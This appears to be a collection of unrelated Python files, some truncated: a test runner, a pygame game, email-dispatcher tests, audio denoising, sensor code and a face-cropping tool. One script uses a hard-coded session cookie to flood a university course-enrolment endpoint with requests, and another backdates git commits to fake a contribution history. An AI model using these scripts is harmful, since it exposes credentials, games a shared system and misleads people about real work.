    "import logging\nimport sys\nimport os\nimport json\nimport traceback\nimport inspect\nimport time\nfrom datetime import datetime\nfrom collections import Counter\n\ntry:\n    from pathlib import Path\nexcept ImportError:\n    raise ImportError(\"pathlib is required but not found.\")\n\nimport importlib.util\n\nfrom . import __version__\n\ntry:\n    from colorama import init as colorama_init, Fore, Style\n    colorama_init(autoreset=True)\nexcept ImportError:\n    class _FallbackFore:\n        RED = GREEN = YELLOW = MAGENTA = CYAN = \"\"\n    class _FallbackStyle:\n        RESET_ALL = \"\"\n    Fore = _FallbackFore()\n    Style = _FallbackStyle()\n\nCONFIG_FILE = \".micropytest.json\"\nTIME_REPORT_CUTOFF = 0.01 # dont report timings below this\n\nclass SkipTest(Exception):\n    \"\"\"\n    Raised by a test to indicate it should be skipped.\n    \"\"\"\n    pass\n\nclass LiveFlushingStreamHandler(logging.StreamHandler):\n    \"\"\"\n    A stream handler that flushes logs immediately, giving real-time console output.\n    \"\"\"\n    def emit(self, record):\n        super(LiveFlushingStreamHandler, self).emit(record)\n        self.flush()\n\n\ndef create_live_console_handler(formatter=None, level=logging.INFO):\n    handler = LiveFlushingStreamHandler(stream=sys.stdout)\n    if formatter:\n        handler.setFormatter(formatter)\n    handler.setLevel(level)\n    return handler\n\n\nclass TestContext:\n    \"\"\"\n    A context object passed to each test if it accepts 'ctx'.\n    Allows logging via ctx.debug(), etc., storing artifacts, and now skipping.\n    \"\"\"\n    def __init__(self):\n        self.log_records = []\n        self.log = logging.getLogger()\n        self.artifacts = {}\n\n    def debug(self, msg):\n        self.log.debug(msg)\n\n    def warn(self, msg):\n        self.log.warning(msg)\n\n    def error(self, msg):\n        self.log.error(msg)\n\n    def fatal(self, msg):\n        self.log.critical(msg)\n\n    def add_artifact(self, key, value):\n        from pathlib import Path\n        if isinstance(value, (str, Path)):\n            path_val = Path(value)\n            if path_val.is_file():\n                self.debug(\"Artifact file '{}' exists.\".format(value))\n            else:\n                self.warn(\"Artifact file '{}' does NOT exist.\".format(value))\n            self.artifacts[key] = {'type': 'filename', 'value': value}\n        else:\n            self.artifacts[key] = {'type': 'primitive', 'value': value}\n\n    def skip_test(self, msg=None):\n        \"\"\"\n        Tests can call this to be marked as 'skipped', e.g. if the environment\n        doesn't apply or prerequisites are missing.\n        \"\"\"\n        raise SkipTest(msg or \"Test was skipped by ctx.skip_test(...)\")\n\nclass GlobalContextLogHandler(logging.Handler):\n    \"\"\"\n    A handler that captures all logs into a single test's context log_records,\n    so we can show them in a final summary or store them.\n    \"\"\"\n    def __init__(self, ctx, formatter=None):\n        logging.Handler.__init__(self)\n        self.ctx = ctx\n        if formatter:\n            self.setFormatter(formatter)\n\n    def emit(self, record):\n        msg = self.format(record)\n        self.ctx.log_records.append((record.levelname, msg))\n\n\nclass SimpleLogFormatter(logging.Formatter):\n    \"\"\"\n    Format logs with a timestamp and color-coded level, e.g.:\n    HH:MM:SS LEVEL|LOGGER| message\n    \"\"\"\n    def format(self, record):\n        tstamp = datetime.now().strftime(\"%H:%M:%S\")\n        level = record.levelname\n        origin = record.name\n        message = record.getMessage()\n\n        if level in (\"ERROR\", \"CRITICAL\"):\n            color = Fore.RED\n        elif level == \"WARNING\":\n            color = Fore.YELLOW\n        elif level == \"DEBUG\":\n            color = Fore.MAGENTA\n        elif level == \"INFO\":\n            color = Fore.CYAN\n        else:\n            color = \"\"\n\n        return \"{}{} {:8s}|{:11s}| {}{}\".format(\n            color, tstamp, level, origin, message, Style.RESET_ALL\n        )\n\n\ndef load_test_module_by_path(file_path):\n    \"\"\"\n    Dynamically import a Python file as a module, so we can discover test_* functions.\n    \"\"\"\n    spec = importlib.util.spec_from_file_location(\"micropytest_dynamic\", file_path)\n    module = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(module)\n    return module\n\n\ndef find_test_files(start_dir=\".\"):\n    \"\"\"\n    Recursively find all *.py that match test_*.py or *_test.py,\n    excluding typical venv, site-packages, or __pycache__ folders.\n    \"\"\"\n    test_files = []\n    for root, dirs, files in os.walk(start_dir):\n        if (\".venv\" in root) or (\"venv\" in root) or (\"site-packages\" in root) or (\"__pycache__\" in root):\n            continue\n        for f in files:\n            if f.startswith(\"test_\") or f.endswith(\"_test.py\"):\n                test_files.append(os.path.join(root, f))\n    return test_files\n\n\ndef load_lastrun(tests_root):\n    \"\"\"\n    Load .micropytest.json from the given tests root (tests_root/.micropytest.json), if present.\n    Returns a dict with test durations, etc.\n    \"\"\"\n    p = Path(tests_root) / CONFIG_FILE\n ",
    "#Dodle Jump\n#Created by Suraj Saripalli\n\nimport pygame\nimport time\nimport random\n\npygame.init()\ns = pygame.display.set_mode((1362, 800))\npygame.display.set_caption(\"Dodle Jums\")\npos = (15, 960)\nbg = pygame.image.load(\"dodle.png\")\nwomp = pygame.image.load(\"wompwomp.jpg\").convert_alpha()\nloading_bg  = pygame.image.load(\"loading.jpg\")\nhalp = pygame.image.load(\"halp.jpeg\")\nclock = pygame.time.Clock()\nog_x = 0\nog_y = 700\nog_man_x = -50\nog_man_y = 580\nup = False\ndown = True\njumper = 75\nscore = 0\nfont = pygame.font.Font(None, 256)\n\ns.blit(halp, (0,0))\npygame.display.flip()\ntime.sleep(5)\ns.blit(loading_bg, (0,0))\npygame.display.flip()\ngaming = False\nloading = True\n    \ndef hitboxes(jums):\n    global dodle_man\n    pygame.draw.rect(s,( 255, 0, 0), dodle_man.collision_rect, 2) #Test hitboxes for dodle_man\n    for platform in jums:\n        '''Test hitboxes for jums'''\n        pygame.draw.rect(s, (0, 255, 0), platform, 2)\n    \nclass Dodle_man(pygame.sprite.Sprite):\n    def __init__(self, image, scale, x, y):\n        pygame.sprite.Sprite.__init__(self)\n        og_image = pygame.image.load(image).convert_alpha()\n        w = int(og_image.get_width() * scale)\n        h = int(og_image.get_height() * scale)\n        self.image = pygame.transform.scale(og_image, (w,h))\n        self.rect = self.image.get_rect()\n        self.rect.x = x\n        self.rect.y = y\n        self.collision_rect = self.rect.copy()\n        self.collision_rect.width = 45\n        self.collision_rect.height = self.rect.height - 55\n        self.collision_rect.y = self.rect.y\n        self.collision_rect.x = self.rect.x\n        self.collision_rect.centerx = self.rect.centerx\n\nclass Jums(pygame.sprite.Sprite):\n    def __init__(self, image, scale, x, y):\n        pygame.sprite.Sprite.__init__(self)\n        og_image = pygame.image.load(image).convert_alpha()\n        w = int(og_image.get_width() * scale)\n        h = int(og_image.get_height() * scale)\n        self.image = pygame.transform.scale(og_image, (w,h))\n        self.rect = self.image.get_rect()\n        self.rect.x = x\n        self.rect.y = y\n\n            \n\ndef objects():\n    dodle_man = Dodle_man(\"dodle_man.png\", 0.5, og_man_x, og_man_y)\n    jums = pygame.sprite.Group()\n    jum = Jums(\"jums.png\", 0.125, og_x, og_y)\n    jum1 = Jums(\"jums.png\", 0.125, random.randint(0,350), random.randint(570,580))\n    jum2 = Jums(\"jums.png\", 0.125, random.randint(300,500), random.randint(480,500))\n    jum3 = Jums(\"jums.png\", 0.125, random.randint(700,1000), random.randint(525,550))\n    jum4 = Jums(\"jums.png\", 0.125, random.randint(900,1200), random.randint(400,500))\n    jum5 = Jums(\"jums.png\", 0.125, random.randint(1000,1250), random.randint(400, 600))\n    jum6 = Jums(\"jums.png\", 0.125, random.randint(700,1000), random.randint(275, 300))\n    jum7 = Jums(\"jums.png\", 0.125, random.randint(500,1000), random.randint(150, 250))\n    jum8 = Jums(\"jums.png\", 0.125, random.randint(500,1000), random.randint(50, 100))\n    jums.add(jum, jum1, jum2, jum3, jum4, jum5, jum6, jum7, jum8)\n    sprites = pygame.sprite.Group()\n    sprites.add(dodle_man)\n    sprites.add(jums)\n\n    return jums, sprites, dodle_man\n\njums, sprites, dodle_man = objects()\n\n\n\n\nwhile loading == True:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            loading = False\n    \n    start = pygame.key.get_pressed()\n    if start[pygame.K_s]:\n        loading = False\n        gaming = True\n\n    s.blit(loading_bg, (0,0))\n    pygame.display.flip()\n    clock.tick(50)\n\n\n\nwhile gaming == True:\n    s.blit(bg, (0,0))\n    bottom = pygame.Rect(dodle_man.collision_rect.left, dodle_man.collision_rect.bottom, dodle_man.collision_rect.width, 1)\n\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            gaming = False\n            \n    if up:\n        dodle_man.collision_rect.y -= 100\n        dodle_man.rect.y -= 100\n        up = False\n        down = True\n    \n    if down:\n        dodle_man.collision_rect.y += 5\n        dodle_man.rect.y += 5\n        for platform in jums:\n            if bottom.colliderect(platform.rect):\n                score += 1\n                down = False\n                up = True\n    \n    if dodle_man.rect.y > 801:\n        score_display = font.render(f\"Score: {score}\", True, (0,0,0))\n        s.blit(womp, (0,0))\n        s.blit(score_display, (300, 600))\n        pygame.display.flip()\n        time.sleep(2)\n        gaming = False\n        pygame.quit()\n    \n    if bottom.y < -35:\n        dodle_man.rect.x = og_man_x\n        dodle_man.collision_rect.x = og_man_x\n        dodle_man.rect.y = og_man_y\n        dodle_man.collision_rect.y = og_man_y\n        time.sleep(1)\n        jums, sprites, dodle_man = objects()\n        \n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_RIGHT]:\n        dodle_man.collision_rect.x += 10\n        dodle_man.rect.x += 10\n    if keys[pygame.K_LEFT]:\n        dodle_man.collision_rect.x -= 10\n        dodle_man.rect.x -= 10\n    if keys[pygame.K_ESCAPE]:\n        loading = True\n        gaming = False",
    "import unittest\nimport os\nimport configparser\nfrom unittest.mock import patch, MagicMock\nimport logging\nfrom chapar import (\n    load_config,\n    read_html,\n    read_csv,\n    _create_smtp_server,\n    send_email,\n    main\n)\nfrom io import StringIO\n\nclass TestEmailDispatcher(unittest.TestCase):\n\n    def setUp(self):\n        self.test_folder = \"test_data\"\n        os.makedirs(self.test_folder, exist_ok=True)\n        logging.disable(logging.CRITICAL)  # Disable logs during tests\n\n    def tearDown(self):\n        for f in os.listdir(self.test_folder):\n            os.remove(os.path.join(self.test_folder, f))\n        os.rmdir(self.test_folder)\n        logging.disable(logging.NOTSET)\n\n    def create_config(self, sections=None):\n        config = configparser.ConfigParser()\n        if sections:\n            for section, options in sections.items():\n                config.add_section(section)\n                for key, value in options.items():\n                    config.set(section, key, value)\n        with open(os.path.join(self.test_folder, \"config.ini\"), 'w') as f:\n            config.write(f)\n\n    def test_load_config_valid(self):\n        self.create_config({\n            'SMTP': {'Host': 'smtp.example.com', 'Port': '587', 'Email': 'user@example.com', \n                     'Password': 'pass', 'Subject': 'Hello'},\n            'Settings': {'Interval': '1'}\n        })\n        config = load_config(self.test_folder)\n        self.assertEqual(config['SMTP']['Host'], 'smtp.example.com')\n\n    def test_load_config_missing_section(self):\n        self.create_config({'SMTP': {'Host': '...'}})\n        with self.assertRaises(ValueError):\n            load_config(self.test_folder)\n\n    def test_read_html_valid(self):\n        with open(os.path.join(self.test_folder, \"email_template.html\"), 'w') as f:\n            f.write(\"<html></html>\")\n        content = read_html(self.test_folder)\n        self.assertEqual(content, \"<html></html>\")\n\n    def test_read_html_missing(self):\n        with self.assertRaises(FileNotFoundError):\n            read_html(self.test_folder)\n\n    def test_read_csv_valid(self):\n        with open(os.path.join(self.test_folder, \"recipients.csv\"), 'w') as f:\n            f.write(\"email,name\\njohn@doe.com,John\")\n        recipients = read_csv(self.test_folder)\n        self.assertEqual(len(recipients), 1)\n        self.assertEqual(recipients[0]['email'], 'john@doe.com')\n\n    def test_read_csv_missing_columns(self):\n        with open(os.path.join(self.test_folder, \"recipients.csv\"), 'w') as f:\n            f.write(\"email\\njohn@doe.com\")\n        with self.assertRaises(ValueError):\n            read_csv(self.test_folder)\n\n    @patch('smtplib.SMTP_SSL')\n    @patch('smtplib.SMTP')\n    def test_create_smtp_server(self, mock_smtp, mock_smtp_ssl):\n        # Test SSL\n        _create_smtp_server('host', 465, 'user', 'pass')\n        mock_smtp_ssl.assert_called_once_with('host', 465, timeout=10)\n\n        # Test TLS\n        _create_smtp_server('host', 587, 'user', 'pass')\n        mock_smtp.assert_called_once_with('host', 587, timeout=10)\n        mock_smtp.return_value.starttls.assert_called_once()\n\n    @patch('email_dispatcher._create_smtp_server')\n    def test_send_email_success(self, mock_smtp):\n        mock_server = MagicMock()\n        mock_smtp.return_value = mock_server\n        smtp_settings = {\n            'host': 'host', 'port': 587, 'email': 'from@example.com',\n            'password': 'pass', 'subject': 'Test', 'DisplayName': 'Test'\n        }\n        result = send_email(smtp_settings, 'to@example.com', 'John', \n                           '<html>{{name}}</html>', 'detailed', 'test')\n        self.assertTrue(result)\n        mock_server.sendmail.assert_called_once()\n\n    @patch('email_dispatcher._create_smtp_server')\n    def test_send_email_failure(self, mock_smtp):\n        mock_smtp.side_effect = Exception(\"SMTP error\")\n        smtp_settings = {'host': 'host', 'port': 587, 'email': 'from@example.com',\n                        'password': 'pass', 'subject': 'Test'}\n        result = send_email(smtp_settings, 'to@example.com', 'John', \n                           '<html></html>', 'none', 'test')\n        self.assertFalse(result)\n\n    @patch('email_dispatcher.load_config')\n    @patch('email_dispatcher.read_html')\n    @patch('email_dispatcher.read_csv')\n    @patch('email_dispatcher.send_email')\n    @patch('time.sleep')\n    def test_main_success(self, mock_sleep, mock_send, mock_csv, mock_html, mock_config):\n        mock_config.return_value = {\n            'SMTP': {'Host': 'host', 'Port': '587', 'Email': 'user', \n                    'Password': 'pass', 'Subject': 'Subj'},\n            'Settings': {'Interval': '0', 'LogLevel': 'detailed'}\n        }\n        mock_html.return_value = \"<html></html>\"\n        mock_csv.return_value = [{'email': 'a@b.com', 'name': 'Alice'}]\n        mock_send.return_value = True\n\n        main(self.test_folder)\n        self.assertEqual(mock_send.call_count, 1)\n\n    @patch('email_dispatcher.load_config')\n    def test_main_con",
    "import soundfile as sf\nfrom tensorflow.keras.models import load_model # type: ignore\nfrom data_tools import scaled_in, inv_scaled_ou\nfrom data_tools import audio_files_to_numpy, numpy_audio_to_matrix_spectrogram, matrix_spectrogram_to_numpy_audio\n\n\ndef prediction(weights_path,name_model, audio_dir_prediction, dir_save_prediction, audio_input_prediction,\n               audio_output_prediction, sample_rate, min_duration, frame_length, hop_length_frame, n_fft, hop_length_fft):\n    \"\"\" This function takes as input a .keras model, noisy voice sound to denoise, predict\n    the denoise sound and save it to disk.\n    \"\"\"\n\n    # Load the .keras model\n    loaded_model = load_model(weights_path + '/' + name_model + '.keras')\n\n    print(\"Loaded model from disk\")\n\n    # Extracting noise and voice from folder and convert to numpy\n    audio = audio_files_to_numpy(audio_dir_prediction, audio_input_prediction, sample_rate,\n                                 frame_length, hop_length_frame, min_duration)\n\n    # Dimensions of squared spectrogram\n    dim_square_spec = int(n_fft / 2) + 1\n    print(dim_square_spec)\n\n    # Create Amplitude and phase of the sounds\n    m_amp_db_audio, m_pha_audio = numpy_audio_to_matrix_spectrogram(\n        audio, dim_square_spec, n_fft, hop_length_fft)\n\n    # Global scaling to have distribution -1/1\n    X_in = scaled_in(m_amp_db_audio)\n    # Reshape for prediction\n    X_in = X_in.reshape(X_in.shape[0], X_in.shape[1], X_in.shape[2], 1)\n    # Prediction using loaded network\n    X_pred = loaded_model.predict(X_in)\n    # Rescale back the noise model\n    inv_sca_X_pred = inv_scaled_ou(X_pred)\n    # Remove noise model from noisy speech\n    X_denoise = m_amp_db_audio - inv_sca_X_pred[:, :, :, 0]\n    # Reconstruct audio from denoised spectrogram and phase\n    print(X_denoise.shape)\n    print(m_pha_audio.shape)\n    print(frame_length)\n    print(hop_length_fft)\n    audio_denoise_recons = matrix_spectrogram_to_numpy_audio(X_denoise, m_pha_audio, frame_length, hop_length_fft)\n    # Number of frames\n    nb_samples = audio_denoise_recons.shape[0]\n    # Save all frames in one file\n    denoise_long = audio_denoise_recons.reshape(1, nb_samples * frame_length) * 10\n    sf.write(dir_save_prediction + audio_output_prediction, denoise_long[0, :], sample_rate)\n",
    "import requests\nimport time\n\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom datetime import timezone\n\n\np_ids = ['247AK74N7ED588RPK0630B18F80A261B']    # \u8bfe\u7a0bID\uff0c\u5728\u9009\u8bfe\u9875\u9762\u70b9\u51fb\u6240\u60f3\u9009\u8bfe\u7a0b\u6240\u5728\u7684\u9876\u90e8\u680f\u540e\uff0c\u5728F12\u7684\u201c\u7f51\u7edc\u201d\u9875\u9762\u5f39\u51fa\u7684\u6570\u636e\u5305\u4e2d\np_xkfsdm = 'xx-b-b'                             # \u8bfe\u7a0b\u7c7b\u578b\uff0c\u4e5f\u5728\u4e0a\u8ff0\u6570\u636e\u5305\u4e2d\uff0c\u4e00\u822c\u662f\u62fc\u97f3\uff0c\u5982\uff1axx-b-b\u8868\u793a\u9650\u9009\uff0cbx-b-b\u8868\u793a\u5fc5\u9009\nxn = '2024-2025'                                # \u76ee\u6807\u8bfe\u7a0b\u5b66\u5e74\nxq = '2'                                        # \u76ee\u6807\u8bfe\u7a0b\u5b66\u671f\uff08\u79cb\u5b631\uff0c\u6625\u5b632\uff0c\u590f\u5b633\uff09\ndqxn = '2024-2025'                              # \u5f53\u524d\u5b66\u5e74\ndqxq = '1'                                      # \u5f53\u524d\u5b66\u671f\uff08\u79cb\u5b631\uff0c\u6625\u5b632\uff0c\u590f\u5b633\uff09\nwait = 1.25                                     # \u62a2\u8bfe\u95f4\u9694\u65f6\u95f4\uff08\u5efa\u8bae\u95f4\u96941.25s\uff09\nstartTime = '12_59_55'                          # \u62a2\u8bfe\u5f00\u59cb\u65f6\u95f4\nswitch = 1                                      # \u662f\u5426\u542f\u7528\u5b9a\u65f6\u62a2\u8bfe\uff1a0\u662f1\u5426\ncookie = '_gscu_651000777=001003220goh0010; JSESSIONID=F7F7E808FD3394F7766022588069BD84; route=2134183320579982c02bf8dff07b0881'\n\n\n\n\nSHA_TZ = timezone(timedelta(hours=8), name='Asia/Shanghai')\nurl = 'http://jw.hitsz.edu.cn/Xsxk/addGouwuche'\nheaders = {\n    'Host': 'jw.hitsz.edu.cn',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',\n    'Accept': '*/*',\n    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n    'Accept-Encoding': 'gzip, deflate',\n    'Referer': 'http://jw.hitsz.edu.cn/Xsxk/query/1',\n    'Content-Length': str(498 + len(p_xkfsdm)),\n    'Origin': 'http://jw.hitsz.edu.cn',\n    'Connection': 'keep-alive',\n    'Cookie': cookie,\n    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n    'RoleCode': '01',\n    'X-Requested-With': 'XMLHttpRequest',\n    'Pragma': 'no-cache',\n    'Cache-Control': 'no-cache'\n    }\n\n# \u751f\u6210\u53d1\u51fa\u7684data\nwhile switch == 0:\n    # \u83b7\u53d6\u5f53\u524d\u5317\u4eac\u65f6\u95f4\n    utc_now = datetime.utcnow().replace(tzinfo=timezone.utc)\n    beijing_now = utc_now.astimezone(SHA_TZ)\n    timen = beijing_now.strftime('%H_%M_%S')\n    print(timen)\n    if timen == startTime:\n        switch = 1\n        break\n\nwhile switch == 1:\n    #\u53d1\u5305\n    try:\n        for i in range(len(p_ids)):\n            data = f'p_pylx=1&mxpylx=1&p_sfgldjr=0&p_sfredis=0&p_sfsyxkgwc=0&p_xktjz=rwtjzyx&p_chaxunxh=&p_gjz=&p_skjs=&p_xn={xn}&p_xq={xq}&p_xnxq={xn+xq}1&p_dqxn={dqxn}&p_dqxq={dqxq}&p_dqxnxq={dqxn+dqxq}4&p_xkfsdm={p_xkfsdm}&p_xiaoqu=&p_kkyx=&p_kclb=&p_xkxs=&p_id={p_ids[i]}&p_sfhlctkc=0&p_sfhllrlkc=0&p_kxsj_xqj=&p_kxsj_ksjc=&p_kxsj_jsjc=&p_kcdm_js=&p_kcdm_cxrw=&p_kc_gjz=&p_xzcxtjz_nj=&p_xzcxtjz_yx=&p_xzcxtjz_zy=&p_xzcxtjz_zyfx=&p_xzcxtjz_bj=&p_sfxsgwckb=1&p_skyy=&p_chaxunxkfsdm=&pageNum=1&pageSize=8'\n            ret = requests.post(url = url,headers=headers, data=data, timeout=1000)\n            response_json = ret.json()\n            print(response_json)\n            time.sleep(wait)\n\n    except Exception as e:\n        print('[Error]: ' + str(e))\n",
    "#!/usr/bin/python\nimport spidev\nimport time\nimport os\nimport RPi.GPIO as GPIO\nGPIO.setmode(GPIO.BOARD)\nGPIO.setwarnings(False)\n\n# Open SPI bus\nspi = spidev.SpiDev()\nspi.open(0,0)\n\n# Define GPIO to LCD mapping\nLCD_RS = 15\nLCD_E  = 16\nLCD_D4 = 7\nLCD_D5 = 11\nLCD_D6 = 12\nLCD_D7 = 13\n# Define sensor channels\nsoil_channel  = 0\n'''\ndefine pin for lcd\n'''\n# Timing constants\nE_PULSE = 0.0005\nE_DELAY = 0.0005\ndelay = 1\n\n\n\nGPIO.setup(LCD_E, GPIO.OUT)  # E\nGPIO.setup(LCD_RS, GPIO.OUT) # RS\nGPIO.setup(LCD_D4, GPIO.OUT) # DB4\nGPIO.setup(LCD_D5, GPIO.OUT) # DB5\nGPIO.setup(LCD_D6, GPIO.OUT) # DB6\nGPIO.setup(LCD_D7, GPIO.OUT) # DB7\n# Define some device constants\nLCD_WIDTH = 16    # Maximum characters per line\nLCD_CHR = True\nLCD_CMD = False\nLCD_LINE_1 = 0x80 # LCD RAM address for the 1st line\nLCD_LINE_2 = 0xC0 # LCD RAM address for the 2nd line\n\n'''\nFunction Name :lcd_init()\nFunction Description : this function is used to initialized lcd by sending the different commands\n'''\ndef lcd_init():\n  # Initialise display\n  lcd_byte(0x33,LCD_CMD) # 110011 Initialise\n  lcd_byte(0x32,LCD_CMD) # 110010 Initialise\n  lcd_byte(0x06,LCD_CMD) # 000110 Cursor move direction\n  lcd_byte(0x0C,LCD_CMD) # 001100 Display On,Cursor Off, Blink Off\n  lcd_byte(0x28,LCD_CMD) # 101000 Data length, number of lines, font size\n  lcd_byte(0x01,LCD_CMD) # 000001 Clear display\n  time.sleep(E_DELAY)\n'''\nFunction Name :lcd_byte(bits ,mode)\nFuction Name :the main purpose of this function to convert the byte data into bit and send to lcd port\n'''\ndef lcd_byte(bits, mode):\n  # Send byte to data pins\n  # bits = data\n  # mode = True  for character\n  #        False for command\n \n  GPIO.output(LCD_RS, mode) # RS\n \n  # High bits\n  GPIO.output(LCD_D4, False)\n  GPIO.output(LCD_D5, False)\n  GPIO.output(LCD_D6, False)\n  GPIO.output(LCD_D7, False)\n  if bits&0x10==0x10:\n    GPIO.output(LCD_D4, True)\n  if bits&0x20==0x20:\n    GPIO.output(LCD_D5, True)\n  if bits&0x40==0x40:\n    GPIO.output(LCD_D6, True)\n  if bits&0x80==0x80:\n    GPIO.output(LCD_D7, True)\n \n  # Toggle 'Enable' pin\n  lcd_toggle_enable()\n \n  # Low bits\n  GPIO.output(LCD_D4, False)\n  GPIO.output(LCD_D5, False)\n  GPIO.output(LCD_D6, False)\n  GPIO.output(LCD_D7, False)\n  if bits&0x01==0x01:\n    GPIO.output(LCD_D4, True)\n  if bits&0x02==0x02:\n    GPIO.output(LCD_D5, True)\n  if bits&0x04==0x04:\n    GPIO.output(LCD_D6, True)\n  if bits&0x08==0x08:\n    GPIO.output(LCD_D7, True)\n \n  # Toggle 'Enable' pin\n  lcd_toggle_enable()\n'''\nFunction Name : lcd_toggle_enable()\nFunction Description:basically this is used to toggle Enable pin\n'''\ndef lcd_toggle_enable():\n  # Toggle enable\n  time.sleep(E_DELAY)\n  GPIO.output(LCD_E, True)\n  time.sleep(E_PULSE)\n  GPIO.output(LCD_E, False)\n  time.sleep(E_DELAY)\n'''\nFunction Name :lcd_string(message,line)\nFunction  Description :print the data on lcd \n'''\ndef lcd_string(message,line):\n  # Send string to display\n \n  message = message.ljust(LCD_WIDTH,\" \")\n \n  lcd_byte(line, LCD_CMD)\n \n  for i in range(LCD_WIDTH):\n    lcd_byte(ord(message[i]),LCD_CHR)\n\n\n\n \n# Function to read SPI data from MCP3008 chip\n# Channel must be an integer 0-7\ndef ReadChannel(channel):\n  adc = spi.xfer2([1,(8+channel)<<4,0])\n  data = ((adc[1]&3) << 8) + adc[2]\n  return data\n\n \n# Function to calculate temperature from\n# TMP36 data, rounded to specified\n# number of decimal places.\ndef ConvertTemp(data,places):\n \n  # ADC Value\n  # (approx)  Temp  Volts\n  #    0      -50    0.00\n  #   78      -25    0.25\n  #  155        0    0.50\n  #  233       25    0.75\n  #  310       50    1.00\n  #  465      100    1.50\n  #  775      200    2.50\n  # 1023      280    3.30\n \n  temp = ((data * 330)/float(1023))\n  temp = round(temp,places)\n  return temp\n \n\n \n# Define delay between readings\ndelay = 5\nlcd_init()\nlcd_string(\"welcome \",LCD_LINE_1)\ntime.sleep(2)\nwhile 1:\n  soil_level = ReadChannel(soil_channel) \n  lcd_string(\"Soil Level  \",LCD_LINE_1)\n  lcd_string(str(soil_level),LCD_LINE_2)\n\n\n  ",
    "import os\nimport random\nimport subprocess\nfrom datetime import datetime, timedelta\n\ndef git_commit(message, commit_date):\n    # Stage the changes\n    subprocess.run(['git', 'add', 'info.txt'])\n    \n    # Create commit with specified date\n    env = os.environ.copy()\n    env['GIT_COMMITTER_DATE'] = commit_date.strftime('%Y-%m-%dT%H:%M:%S')\n    subprocess.run(['git', 'commit', '-m', message, '--date', commit_date.strftime('%Y-%m-%dT%H:%M:%S')], env=env)\n\ndef git_push():\n    # Push the changes to the remote repository\n    subprocess.run(['git', 'push'])\n\n# Main function to create files for a range of dates\ndef fake_commits(start_date, end_date, min_commits, max_commits, skipping=False, max_skip_days=1):\n    file_path = \"info.txt\"  # Single file at the script's level\n\n    current_date = start_date\n    while current_date <= end_date:\n        # skip days randomly, if skiping is enabled\n        if skipping and random.choice([True, False]):\n            skip_days = random.randint(0, max_skip_days)\n            print(f\"\\n\\nSkipping {skip_days} days from {current_date.strftime('%d-%b-%Y')}\")\n            current_date += timedelta(days=skip_days)\n            continue\n\n        # Random number of commits for the current date\n        n_commits = random.randint(min_commits, max_commits)\n        print(f\"\\n\\n{n_commits} commits for date: {current_date.strftime('%d-%b-%Y')}\")\n\n        with open(file_path, \"a\") as file:  # Append mode\n            for i in range(1, n_commits + 1):\n                info = f\"Date: {current_date.strftime('%d-%b-%Y')}, Commit #: {i}\"     \n                with open(file_path, \"w\") as file:\n                    file.write(\"\")  # Clear the file if it exists\n                    file.write(info)\n                print(info)\n                git_commit(info, current_date)\n\n        # Move to the next day\n        current_date += timedelta(days=1)\n    \n    # Push all the changes\n    git_push()\n\n# Set the date range\nstart_date = datetime(2023, 3, 1)\nend_date = datetime(2023, 3, 28)\n\n# Set the min and max number of commits per day\nmin_commits = 1\nmax_commits = 10\n\nfake_commits(start_date, end_date, min_commits, max_commits, skipping=True, max_skip_days=1)",
    "import cv2\nimport os\nimport numpy as np\nfrom ultralytics import YOLO\nfrom tqdm import tqdm\n\ndef create_directory(path):\n    \"\"\"Utility function to create a directory if it doesn't exist.\"\"\"\n    os.makedirs(path, exist_ok=True)\n\ndef delete_directory(path):\n    \"\"\"Utility function to delete a directory if it exists.\"\"\"\n    if os.path.exists(path):\n        for root, dirs, files in os.walk(path, topdown=False):\n            for file in files:\n                os.remove(os.path.join(root, file))\n            for dir in dirs:\n                os.rmdir(os.path.join(root, dir))\n        os.rmdir(path)\n\ndef get_device_selection():\n    \"\"\"Prompt the user to select a device for processing.\"\"\"\n    print(\"Choose your device (enter the number):\")\n    print(\"1) CPU\")\n    print(\"2) GPU(cuda)\")\n    print(\"3) MPS\")\n    device = input().strip()\n    if device == \"1\":\n        return \"cpu\"\n    elif device == \"2\":\n        return \"cuda\"\n    elif device == \"3\":\n        return \"mps\"\n    else:\n        raise ValueError(\"Invalid device selection\")\n\ndef get_processing_mode():\n    \"\"\"Prompt the user to select the processing mode.\"\"\"\n    print(\"Choose your processing mode:\")\n    print(\"1) Process 1 video\")\n    print(\"2) Process 1 video from a specific frame\")\n    print(\"3) Process all videos\")\n    return input(\"Enter the number: \").strip()\n\ndef get_resize_option():\n    \"\"\"Prompt the user to enter the desired resize dimensions.\"\"\"\n    resize = input(\"Enter the desired size for the cropped images (e.g., 128x128 or leave blank to keep original size): \").strip()\n    if resize:\n        try:\n            width, height = map(int, resize.split('x'))\n            return (width, height)\n        except ValueError:\n            print(\"Invalid size format. Using original size.\")\n    return None\n\ndef get_clear_frames_option():\n    \"\"\"Prompt the user to decide whether to clear frames after processing.\"\"\"\n    clear_frames = input(\"Do you want to delete frames after processing? (yes/no): \").strip().lower()\n    if clear_frames == \"yes\":\n        clear_interval = input(\"Enter the interval (in frames) to delete frames during processing (e.g., 10000): \").strip()\n        try:\n            return int(clear_interval)\n        except ValueError:\n            print(\"Invalid interval. Defaulting to no clearing during processing.\")\n    return None\n\ndef get_video_list(input_videos_dir, mode):\n    \"\"\"Get a list of videos to process based on the selected mode.\"\"\"\n    if mode == \"1\":\n        video_name = input(\"Enter the name of the video file (e.g., video1.mp4): \").strip()\n        return [video_name]\n    elif mode == \"2\":\n        video_name = input(\"Enter the name of the video file (e.g., video1.mp4): \").strip()\n        starting_frame = int(input(\"Enter the starting frame number: \").strip())\n        return [(video_name, starting_frame)]\n    elif mode == \"3\":\n        return [f for f in os.listdir(input_videos_dir) if f.lower().endswith((\".mkv\", \".mp4\", \".avi\", \".mov\"))]\n    else:\n        raise ValueError(\"Invalid processing mode selected.\")\n\ndef process_video(video_file, input_videos_dir, output_frames_dir, output_crops_dir, model, device, resize=None, clear_interval=None, starting_frame=0):\n    \"\"\"Process a single video to extract frames and crop detected faces.\"\"\"\n    input_video_path = os.path.join(input_videos_dir, video_file)\n    if not os.path.exists(input_video_path):\n        